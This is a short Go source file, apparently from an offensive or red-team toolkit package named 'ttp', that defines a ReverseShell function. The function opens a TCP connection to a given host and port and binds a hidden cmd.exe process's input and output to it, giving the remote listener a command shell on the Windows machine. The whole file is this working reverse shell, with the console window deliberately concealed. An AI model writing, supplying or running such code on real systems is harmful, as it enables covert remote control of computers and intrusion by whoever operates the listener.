package ttp

import (
	"fmt"
	"net"
	"os/exec"
	"syscall"
)

// ReverseShell connects back to host:port and attaches cmd.exe stdin/stdout/stderr.
func ReverseShell(host string, port int) error {
	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", host, port))
	if err != nil {
		return fmt.Errorf("connect: %w", err)
	}
	defer conn.Close()

	cmd := exec.Command("cmd.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	return cmd.Run()
}
